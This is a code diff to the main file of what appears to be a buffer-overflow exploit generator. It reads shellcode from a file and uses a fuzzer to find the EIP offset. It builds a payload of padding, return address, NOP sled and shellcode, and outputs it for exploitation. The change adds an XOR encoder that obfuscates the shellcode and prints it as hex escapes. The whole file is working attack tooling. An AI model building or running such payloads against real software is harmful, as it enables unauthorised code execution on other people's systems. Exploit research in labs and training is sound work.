@@ -1,11 +1,12 @@
 #include <iostream>
 #include <string>
 #include "Log/Log.hpp"
+#include "Encoder/XorEncoder.hpp"
 #include "Stages/Fuzzer/Fuzzer.hpp"
 
 void printHelp(char* application)
 {
-    std::cerr << application << " [verbose|exploit] payload application" << std::endl;
+    std::cerr << application << " [verbose|exploit] payload-file application-file" << std::endl;
 }
 
 int main(int argc, char* argv[])
@@ -39,16 +40,31 @@ int main(int argc, char* argv[])
     FILE* shellFile = fopen(shellFilepath.c_str(), "rb");
     fseek(shellFile, 0L, SEEK_END);
     long shellLength = ftell(shellFile);
-    char* shell = (char*)malloc(shellLength);
+    uint8_t* shell = (uint8_t*)malloc(shellLength);
     rewind(shellFile);
     fread(shell, shellLength, 1, shellFile);
     fclose(shellFile);
 
-    uint32_t payloadLength = Fuzzer::getEipOffset() + 0x04/*EIP*/ + 0x20/*NOP*/ + shellLength/*Shell*/ + 1/*NULL Terminator*/;
-    if (Fuzzer::getLength() > payloadLength)
-        payloadLength = Fuzzer::getLength() + 1;
+    // Encode shell
+    // std::string encodedShell = std::string((char*)shell, shellLength);
+    std::string encodedShell = XorEncoder::encode(shell, shellLength);
+    shellLength = encodedShell.length();
+    free(shell);
+    shell = nullptr;
 
-    char* payload = (char*)malloc(payloadLength);
+    std::string a = "";
+    for (uint32_t i = 0; i < shellLength; i++)
+    {
+        char buffer[5];
+        sprintf(buffer, "\\x%02x", (uint8_t)(encodedShell[i]));
+        a += std::string(buffer);
+    }
+    Log::success("%s\n", a.c_str());
+
+    // Allocate payload length
+    size_t payloadLength = Fuzzer::getEipOffset() + 0x04/*EIP*/ + 0x20/*NOP*/ + shellLength/*Shell*/ + 1/*NULL Terminator*/;
+
+    uint8_t* payload = (uint8_t*)malloc(payloadLength);
     uint32_t offset = 0;
 
     // Padding
@@ -64,16 +80,14 @@ int main(int argc, char* argv[])
     uint32_t nopEnd = offset + 0x20;
     for (;offset < nopEnd; offset++)
         payload[offset] = '\x90';
-    
+
     // Shell
-    memcpy(payload + offset, shell, shellLength);
+    memcpy(payload + offset, encodedShell.c_str(), shellLength);
     offset += shellLength;
 
-    // End Padding
-    for (;offset < payloadLength; offset++)
-        payload[offset] = '\x90';
-
-    payload[payloadLength - 1] = '\0'; // NULL Terminator
+    // NULL Terminator
+    payload[offset] = '\0';
+    offset++;
 
     // Output python command
     if (Log::mode == LogMode::Verbose)
@@ -90,5 +104,7 @@ int main(int argc, char* argv[])
     }
 
     Log::exploit("%s", payload);
+    free(payload);
+    payload = nullptr;
     return 0;
 }
